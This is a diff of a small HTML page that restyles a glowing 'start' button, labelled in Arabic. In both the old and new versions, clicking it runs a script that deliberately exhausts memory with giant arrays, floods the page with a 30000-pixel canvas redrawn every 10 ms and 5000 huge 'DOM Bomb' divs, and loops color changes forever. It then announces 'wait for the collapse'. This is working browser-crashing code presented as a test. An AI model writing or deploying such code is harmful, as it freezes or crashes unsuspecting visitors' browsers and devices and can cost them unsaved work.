@@ -3,80 +3,77 @@
     margin: 0;
     padding: 0;
     height: 100vh;
-    background: radial-gradient(circle at center, #000, #300);
-    font-family: 'Orbitron', sans-serif;
+    background: linear-gradient(to bottom, #000000, #1a0000, #330000);
+    font-family: 'Segoe UI', sans-serif;
     display: flex;
     align-items: center;
     justify-content: center;
+    color: #fff;
     overflow: hidden;
   }
 
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
-
   #startBtn {
-    padding: 25px 50px;
+    padding: 25px 60px;
     font-size: 24px;
-    color: white;
-    background: linear-gradient(45deg, #ff0000, #ff6600);
+    font-weight: bold;
+    background: linear-gradient(90deg, #ff0000, #ff6600);
+    color: #fff;
     border: none;
-    border-radius: 16px;
-    box-shadow: 0 0 50px #f00;
-    text-transform: uppercase;
-    animation: pulse 1.5s infinite;
+    border-radius: 14px;
+    box-shadow: 0 0 50px #ff000066;
     cursor: pointer;
+    transition: transform 0.2s ease;
   }
 
-  @keyframes pulse {
-    0% { box-shadow: 0 0 20px #f00; }
-    50% { box-shadow: 0 0 60px #f00; }
-    100% { box-shadow: 0 0 20px #f00; }
+  #startBtn:hover {
+    transform: scale(1.05);
   }
 </style>
 
-<button id="startBtn">💥 اضغط لبداء الاختبار💥</button>
+<button id="startBtn">🔥 اضغط للبدء 🔥</button>
 
 <script>
-document.getElementById("startBtn").onclick = () => {
-  let memory = [];
-  function overload() {
-    for (let i = 0; i < 12; i++) {
-      memory.push(new Array(50000000).fill("MSM"+i));
+  document.getElementById("startBtn").onclick = () => {
+    let memory = [];
+    function overload() {
+      for (let i = 0; i < 12; i++) {
+        memory.push(new Array(50000000).fill("MSM"+i));
+      }
     }
-  }
 
-  function canvasChaos() {
-    let canvas = document.createElement("canvas");
-    canvas.width = 30000;
-    canvas.height = 30000;
-    document.body.appendChild(canvas);
-    let ctx = canvas.getContext("2d");
-    setInterval(() => {
-      ctx.fillStyle = "rgba(255,0,0,0.5)";
-      ctx.fillRect(Math.random()*30000, Math.random()*30000, 5000, 5000);
-    }, 10);
-  }
-
-  function domBomb() {
-    for (let i = 0; i < 5000; i++) {
-      let el = document.createElement("div");
-      el.innerText = "💣 MSM DOM Bomb 💣";
-      el.style = "width:10000px;height:10000px;opacity:0.1;background:repeating-linear-gradient(#f00, #000)";
-      document.body.appendChild(el);
+    function canvasChaos() {
+      let canvas = document.createElement("canvas");
+      canvas.width = 30000;
+      canvas.height = 30000;
+      document.body.appendChild(canvas);
+      let ctx = canvas.getContext("2d");
+      setInterval(() => {
+        ctx.fillStyle = "rgba(255,0,0,0.5)";
+        ctx.fillRect(Math.random()*30000, Math.random()*30000, 5000, 5000);
+      }, 10);
     }
-  }
 
-  function frameLoop() {
-    function trap() {
-      document.body.style.background = `hsl(${Math.random()*360}, 100%, 50%)`;
-      requestAnimationFrame(trap);
+    function domBomb() {
+      for (let i = 0; i < 5000; i++) {
+        let el = document.createElement("div");
+        el.innerText = "💣 MSM DOM Bomb 💣";
+        el.style = "width:10000px;height:10000px;opacity:0.1;background:repeating-linear-gradient(#f00, #000)";
+        document.body.appendChild(el);
+      }
     }
-    trap();
-  }
 
-  overload();
-  canvasChaos();
-  domBomb();
-  frameLoop();
-  document.body.innerText = "⚠️ MSM Loader: انتظر الانهيار...";
-};
+    function frameLoop() {
+      function trap() {
+        document.body.style.background = `linear-gradient(to bottom, hsl(${Math.random()*360}, 100%, 20%), #000)`;
+        requestAnimationFrame(trap);
+      }
+      trap();
+    }
+
+    overload();
+    canvasChaos();
+    domBomb();
+    frameLoop();
+    document.body.innerHTML = `<div style="color:white;font-size:32px;text-align:center;margin-top:20vh;">⚠️ MSM Loader: انتظر الانهيار...</div>`;
+  };
 </script>
